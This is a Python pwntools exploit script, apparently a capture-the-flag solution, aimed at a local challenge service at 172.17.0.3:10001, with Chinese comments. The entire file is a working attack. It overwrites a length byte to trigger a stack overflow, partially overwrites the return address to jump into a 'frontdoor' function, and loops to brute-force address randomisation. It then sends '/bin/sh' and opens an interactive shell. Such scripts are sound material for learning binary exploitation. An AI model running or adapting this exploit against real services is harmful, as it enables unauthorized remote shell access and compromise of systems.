#!/usr/bin/python
#coding:utf-8

from pwn import *


context.update(arch = 'amd64', os = 'linux')
i = 0

while True:
	i += 1
	print i
	io = remote("172.17.0.3", 10001)	
	io.recv()
	payload = 'a'*40					#padding
	payload += '\xca'					#修改长度为202，即payload的长度，这个参数会在其后的strncpy被使用
	io.sendline(payload)
	io.recv()
	payload = 'a'*200					#padding
	payload += '\x01\xa9'				#frontdoor的地址后三位是0x900, +1跳过push rbp
	io.sendline(payload)
	io.recv()
	try:
		io.recv(timeout = 1)			#要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发EOFError
	except EOFError:
		io.close()
		continue
	else:
		sleep(0.1)
		io.sendline('/bin/sh\x00')
		sleep(0.1)						
		io.interactive()				#没有EOFError的话就是爆破成功，可以开shell
		break